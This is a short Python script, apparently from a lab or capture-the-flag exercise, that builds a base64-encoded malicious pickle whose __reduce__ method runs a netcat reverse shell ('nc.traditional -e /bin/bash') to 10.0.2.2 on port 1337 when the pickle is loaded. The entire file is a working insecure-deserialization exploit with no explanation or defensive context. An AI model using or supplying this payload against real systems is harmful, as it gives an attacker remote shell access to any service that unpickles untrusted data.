#!/usr/bin/python3
import pickle
import base64
import os

class rce(object):
  def __reduce__(self):
    return (os.system, ('nc.traditional -e /bin/bash 10.0.2.2 1337',))

print(base64.b64encode(pickle.dumps(rce())))
